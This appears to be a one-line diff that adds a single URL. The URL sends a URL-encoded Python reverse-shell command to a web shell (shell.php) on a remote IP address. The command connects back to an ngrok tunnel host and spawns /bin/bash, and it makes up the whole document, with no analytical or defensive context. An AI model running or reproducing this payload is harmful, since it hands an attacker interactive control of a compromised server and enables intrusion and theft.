@@ -1,0 +1,1 @@
+http://100.54.40.86:9999/shell.php?cmd=python3%20-c%20%27import%20socket,os,pty;s=socket.socket();s.connect((%220.tcp.sa.ngrok.io%22,14637));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/bash%22)%27
